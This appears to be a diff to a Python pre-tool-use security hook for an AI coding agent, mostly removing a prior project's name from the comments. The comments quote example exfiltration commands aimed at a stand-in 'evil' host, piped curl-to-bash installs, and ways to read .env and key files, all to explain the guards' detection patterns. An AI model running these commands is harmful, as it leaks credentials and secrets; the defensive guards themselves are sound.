@@ -6,7 +6,7 @@ Runs before every Claude Code tool call. Exit 0 = allow. Exit 2 = block
 stdout is ignored). Unlike git hooks, the model cannot bypass these — there
 is no --no-verify equivalent.
 
-Error posture (todoclaw GAP 4 parity, 2026-08-22): Claude Code treats exit 2
+Error posture: Claude Code treats exit 2
 as "block" and ANY OTHER non-zero exit (an uncaught exception → exit 1) as a
 *non-blocking* error — the tool then RUNS, so a crash silently fails OPEN.
 All guards therefore run inside a fail-CLOSED boundary (`_dispatch`, bottom of
@@ -14,13 +14,13 @@ file): if a crafted `tool_input` makes a matcher throw, we block instead of
 allowing. The workflow guards (branch / merged-PR / cross-worktree) swallow
 their own git/gh/network errors and deliberately stay fail-open.
 
-Distilled from todoclaw's .claude/hooks/pre-tool-use.py v2 — in production
+Distilled from a production Claude Code hook suite (v2) — in production
 2026-06-23 → 2026-07-03 across a full build (Stages 0–6). The v2 hardening
 (prose-stripping, branch-scoped push guard) shipped post-retro on 2026-07-03.
-Hardened again 2026-08-23 with todoclaw's post-fork lessons: stderr block
+Hardened again 2026-08-23 with later production lessons: stderr block
 reasons, path-target secret guard, egress guard, anchored rm flags, widened
 self-protection, fail-closed dispatch, and the cwd-based session-root fix for
-subagent worktrees — see docs/adr/2026-08-23-todoclaw-parity-hook-hardening.md.
+subagent worktrees — see docs/adr/2026-08-23-hook-hardening-and-session-root.md.
 Every guard here is verified by the block/allow battery in test_hooks.py,
 which runs in CI.
 
@@ -47,8 +47,7 @@ import sys
 def block(reason: str) -> None:
     # The reason must go to STDERR: for a blocking exit 2, Claude Code relays
     # stderr to the model and IGNORES stdout — printed there, every deny shows
-    # up as "PreToolUse:... hook error: ... No stderr output", reason lost
-    # (todoclaw PR #309, 2026-07-22).
+    # up as "PreToolUse:... hook error: ... No stderr output", reason lost.
     print(f"[Security Hook] BLOCKED: {reason}", file=sys.stderr)
     sys.exit(2)
 
@@ -164,8 +163,8 @@ BRANCH_HELP = (
 # ── Branch-naming guard: work only happens on a properly-named branch ──────────
 # docs/COLLABORATION.md's convention: <type>/<short-kebab-desc>, type in
 # feat|fix|chore|refactor|docs. A fresh Claude Code worktree session defaults to
-# an auto-generated `claude/<random-codename>` branch (e.g. claude/cool-jones-ca5); in
-# todoclaw one landed UNRENAMED in a real PR. Blocking Edit/Write/commit the same
+# an auto-generated `claude/<random-codename>` branch (e.g. claude/cool-jones-ca5);
+# one such branch once landed UNRENAMED in a real PR. Blocking Edit/Write/commit the same
 # way the main/master guard does forces a rename before any work, not just a
 # reminder. (Fails open on an empty branch string, e.g. outside a repo.)
 BRANCH_NAME_RE = re.compile(r"^(feat|fix|chore|refactor|docs)/[a-z0-9][a-z0-9-]*$")
@@ -207,7 +206,7 @@ def _in_project(path: str) -> bool:
 # A write whose path belongs to a SIBLING/PARENT worktree — classically the main
 # checkout (on `main`), reached via a persisted `cd` into it — skips every guard and
 # lands there SILENTLY: tests/typecheck here still pass against the unmodified files,
-# so a whole session's edits can go to the wrong checkout unnoticed (todoclaw PR #77,
+# so a whole session's edits can go to the wrong checkout unnoticed (seen in a
 # 2026-07-03 retro). Resolve the target's OWNING worktree via `git worktree list` (the
 # most-specific/longest root that contains it); if that isn't THIS session's worktree
 # (PROJECT_ROOT — the ACTING session's root, resolved from the hook process's cwd, so
@@ -272,9 +271,9 @@ def _owning_worktree(path: str, roots):
 # ── Merged-PR guard: no commits/pushes on a branch whose PR already merged ──────
 # A branch pushed with more work after its PR merges is silently stranded: GitHub
 # stops syncing that PR's head and stops running CI on further pushes to the
-# branch (burned real debugging time in todoclaw before "PR merged" was recognized
-# as the cause — ported from todoclaw PR #61, 2026-07-03). Only fires once the
-# branch has an upstream (skips fresh local-only branches, avoiding a network
+# branch (burned real debugging time before "PR merged" was recognized as the
+# cause, 2026-07-03). Only fires once the branch has an upstream (skips fresh
+# local-only branches, avoiding a network
 # call), and fails open on any gh/network error — never block on something this
 # can't verify.
 MERGED_PR_HELP = (
@@ -387,7 +386,7 @@ def _is_self_protected(path: str) -> bool:
         ap = os.path.realpath(path)
         return ap in {os.path.realpath(p) for p in SELF_PROTECTED}
     except Exception:
-        return True  # unresolvable path → fail CLOSED (todoclaw GAP 1 parity)
+        return True  # unresolvable path → fail CLOSED
 
 
 # Bash detection: a write/mutation operator TARGETING a protected file — the path
@@ -410,7 +409,7 @@ _SELF_MUTATE_RE = re.compile(
 
 
 # ── Secret-file target match (Bash) ─────────────────────────────────────────────
-# todoclaw GAP 2 parity (2026-08-23). The old guard was a verb denylist (cat/less/
+# Hardened 2026-08-23. The old guard was a verb denylist (cat/less/
 # head/tail/bat/open/more) so `xxd`, `od`, `strings`, `grep`, `base64`,
 # `node -e 'readFileSync(".env.local")'`, and `source .env.local && echo $VAR` all
 # sailed through. Match the sensitive PATH regardless of the leading command — and
@@ -419,7 +418,7 @@ _SELF_MUTATE_RE = re.compile(
 # secret read). Lookarounds keep property access from tripping: `process.env` has a
 # word char before the dot (.env arm), and `obj.key` is followed by expression
 # syntax like `)` — a real file argument ends at whitespace/quote/end, which is what
-# the .pem/.key arms require. (todoclaw's verbatim (?!\w) tail false-positived on
+# the .pem/.key arms require. (An earlier (?!\w) tail false-positived on
 # obj.key; the follow-context fixes that — the residual FP is `obj.key` hard against
 # a closing quote.) `.env.example` is deliberately exempt.
 SENSITIVE_PATH_RE = re.compile(
@@ -443,7 +442,7 @@ SENSITIVE_BASENAME_RE = re.compile(r"(?<!\w)(?:id_rsa|credentials)(?!\w)", re.IG
 
 
 # ── Egress guard: block obvious outbound exfiltration ───────────────────────────
-# todoclaw GAP 3 parity (2026-08-23). The supply-chain guard below stops
+# Added 2026-08-23. The supply-chain guard below stops
 # `curl … | bash` (inbound), but nothing stopped OUTBOUND exfil like
 # `curl -d @file https://evil` or `curl 'https://evil/?k=$SECRET'` — which under
 # bypassPermissions runs with no prompt. We can't enumerate every shape, so this is
@@ -464,7 +463,7 @@ EGRESS_ALLOW_SUFFIXES = (
     "anthropic.com",       # api.anthropic.com
     "npmjs.org",           # registry.npmjs.org
     # ── STACK-SPECIFIC extension slot — append YOUR project's backends ──
-    # (worked example — todoclaw's Supabase stack adds:)
+    # (worked example — a managed Postgres backend would add:)
     #   "supabase.co",
     #   "supabase.com",
     # Add a battery case in test_hooks.py for every suffix you add.
@@ -511,7 +510,7 @@ def _egress_hosts(cmd: str):
 
 # ── Bash prose-stripping ──────────────────────────────────────────────────────
 def _strip_prose(c: str) -> str:
-    """v2 (todoclaw retro 2026-07-03): guards must match OPERATIONS, not PROSE.
+    """v2 (2026-07-03 retro): guards must match OPERATIONS, not PROSE.
 
     Commit messages and PR titles/bodies passed inline (-m "drop stale rows")
     were false-positiving the destructive-verb patterns below. Strip quoted
@@ -596,7 +595,7 @@ def _dispatch(data) -> None:
         # The short-flag run must START an argument token — (?:^|[\s'"]) before the
         # dash — because unanchored, interior dashes in FILENAMES matched too and
         # false-blocked plain `rm`: probe-future-date.ts (-futur ~ -f..r),
-        # build-for-prod.txt (-for) (todoclaw PR #309). Real spellings (rm -rf,
+        # build-for-prod.txt (-for). Real spellings (rm -rf,
         # -fr, -irf, quoted '-rf', --recursive) still block.
         # Case-insensitive so `-Rf`/`-fR` block too, and a third arm catches the
         # flags split across separate tokens (`rm -r -f x`).
@@ -629,7 +628,7 @@ def _dispatch(data) -> None:
                 "these paths are gitignored to prevent leaks."
             )
 
-        # Push guard v2 (todoclaw retro 2026-07-03): protect main/master from ANY
+        # Push guard v2 (2026-07-03 retro): protect main/master from ANY
         # push; elsewhere allow the safe `--force-with-lease` (refuses to clobber
         # unseen remote commits) but block bare `--force`/`-f`. GitHub branch
         # protection is the server-side backstop for anything this heuristic misses.
@@ -652,7 +651,7 @@ def _dispatch(data) -> None:
                     block(MERGED_PR_HELP.format(branch=branch, number=merged["number"]))
 
         # Merging a PR (with or without --auto) is the HUMAN's action only — Claude
-        # opens PRs and stops there (todoclaw near-miss 2026-07-03: `gh pr merge
+        # opens PRs and stops there (near-miss 2026-07-03: `gh pr merge
         # --auto` was briefly used on Claude-opened PRs before being corrected;
         # auto-merge still means the agent caused the merge). `--disable-auto` is
         # exempted since it only *undoes* an auto-merge, never causes one.
@@ -806,7 +805,7 @@ except Exception:
     # battery asserts this behavior (case "garbage stdin").
     sys.exit(0)
 
-# Fail CLOSED on internal errors (todoclaw GAP 4 parity): Claude Code treats a
+# Fail CLOSED on internal errors: Claude Code treats a
 # non-2 nonzero exit as NON-blocking — the tool would run. If a security matcher
 # raises on a crafted/unexpected tool_input, block instead of crashing to exit 1.
 # The workflow guards inside swallow their own errors (fail-open by design), so
